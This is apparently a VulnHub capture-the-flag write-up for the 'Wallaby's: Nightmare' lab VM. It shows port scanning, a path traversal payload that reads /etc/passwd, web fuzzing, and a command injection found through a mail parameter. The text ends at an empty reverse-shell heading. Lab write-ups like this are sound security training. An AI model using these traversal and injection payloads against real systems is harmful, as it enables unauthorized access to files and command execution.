# Wallaby's: Nightmare

## 1.GET VM IP

```text
root@kali: arp-scan -I eth1 -l

Interface: eth1, type: EN10MB, MAC: 00:0c:29:3a:bc:b3, IPv4: 192.168.127.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.127.1   00:50:56:c0:00:01       VMware, Inc.
192.168.127.233 00:0c:29:96:ab:45       VMware, Inc.
192.168.127.254 00:50:56:fd:64:8a       VMware, Inc.
```

The IP address is `192.168.127.233`, let's enumerate the machine.

## 2.Enumeration

```text
root@kali: nmap -sV -sC -p- -v -oN fullscan 192.168.127.233

Nmap scan report for 192.168.127.233
Host is up (0.00012s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 6e:07:fc:70:20:98:f8:46:e4:8d:2e:ca:39:22:c7:be (RSA)
|   256 99:46:05:e7:c2:ba:ce:06:c4:47:c8:4f:9f:58:4c:86 (ECDSA)
|_  256 4c:87:71:4f:af:1b:7c:35:49:ba:58:26:c1:df:b8:4f (ED25519)
80/tcp   open     http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Wallaby's Server
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
6667/tcp filtered irc
MAC Address: 00:0C:29:96:AB:45 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

port `6667` is filtered here, it's weird, let's begin by checking the website :

![firstPage](https://github.com/Git-K3rnel/VulnHub/assets/127470407/9044b9e0-6133-4d36-adb8-1aa1411d4985)

i entered my name and clicked submit :

![secondPage](https://github.com/Git-K3rnel/VulnHub/assets/127470407/382e8f34-5d08-4879-ae79-116ff0617291)

in the next page there is a message, but look at the URL and the page parameter which can be manipulated

i entered another word in `page` parameter and the page below showed up :

![testPage](https://github.com/Git-K3rnel/VulnHub/assets/127470407/12e9fad5-4921-40e0-81d2-d7bc1a0d9b8a)

now i'm suspicious to this parameter, i tried path traversal payloads and it worked :

![pathTraversal](https://github.com/Git-K3rnel/VulnHub/assets/127470407/661ac9e0-e246-4ff4-96bf-dd340e447687)

we found three users here :

```text
walfin:x:1000:1000:walfin,,,:/home/walfin:/bin/bash
steven?:x:1001:1001::/home/steven?:/bin/bash
ircd:x:1003:1003:,,,:/home/ircd:/bin/bash
```

then i tried to see other files like `/etc/shadow` that this message appeared :

![shadowFile](https://github.com/Git-K3rnel/VulnHub/assets/127470407/4a39972b-2181-4e13-bec2-7d313a7ed7c1)

after this i could not connect to machine on port 80 any more, i think diffucly increase is that the service is not 

available on port 80, so i scanned the machine one more time :

```text
root@kali: nmap -sV -sC  -p- -v -oN fullscan2 192.168.127.233

Nmap scan report for 192.168.127.233
Host is up (0.00013s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 6e:07:fc:70:20:98:f8:46:e4:8d:2e:ca:39:22:c7:be (RSA)
|   256 99:46:05:e7:c2:ba:ce:06:c4:47:c8:4f:9f:58:4c:86 (ECDSA)
|_  256 4c:87:71:4f:af:1b:7c:35:49:ba:58:26:c1:df:b8:4f (ED25519)
6667/tcp  filtered irc
60080/tcp open     http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Wallaby's Server
|_http-server-header: Apache/2.4.18 (Ubuntu)
MAC Address: 00:0C:29:96:AB:45 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

yes, the service is now has been moved on port 60080, so let's open the site on this port :

![newPage](https://github.com/Git-K3rnel/VulnHub/assets/127470407/ad7c2230-6008-43b3-84ea-83c93f0719d5)

this time fuzzing the website, i found nothing, so tried to check it with `nikto` :

```text
root@kali: nikto -host http://192.168.127.233:60080

- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.127.233
+ Target Hostname:    192.168.127.233
+ Target Port:        60080
+ Start Time:         2023-09-30 03:15:39 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /index.php?page=../../../../../../../../../../etc/passwd: The PHP-Nuke Rocket add-in is vulnerable to file traversal, allowing an attacker to view any file on the host. (probably Rocket, but could be any index.php).
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 8102 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2023-09-30 03:15:54 (GMT-4) (15 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

yes, it found again the page `/index.php?page=../../../../../../../etc/passwd`, now i can fuzz this parameter again :

```text
root@kali: ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.127.233:60080/index.php?page=FUZZ -fs 898

home                    [Status: 200, Size: 1146, Words: 220, Lines: 31, Duration: 4ms]
contact                 [Status: 200, Size: 895, Words: 182, Lines: 27, Duration: 271ms]
'                       [Status: 200, Size: 1742, Words: 315, Lines: 39, Duration: 2ms]
index                   [Status: 200, Size: 1361, Words: 279, Lines: 39, Duration: 516ms]
mailer                  [Status: 200, Size: 1084, Words: 204, Lines: 30, Duration: 4ms]
blacklist               [Status: 200, Size: 993, Words: 202, Lines: 28, Duration: 5ms]
```

let's check these words for page parameter, on checking the `mailer` value i reached to this page :

![comming soon](https://github.com/Git-K3rnel/VulnHub/assets/127470407/2672f542-8572-41a8-95f1-a66716cd6f30)

checking the page source shows a comment section :

![comment](https://github.com/Git-K3rnel/VulnHub/assets/127470407/aaec13b9-6775-485e-9ef3-3d8ec148b5b3)

that says we can send a mail with the URL like `/?page=mailer&mail=message`, this new parameter (mail) should be tested.

i simply entered the `id` value and it showed the output of id command in linux system :

![id](https://github.com/Git-K3rnel/VulnHub/assets/127470407/4e8ef4bd-a30f-4205-918d-2bf86166d85a)

yes, we have command injection here, and we can get a reverse shell.

## 3.Gaining Shell












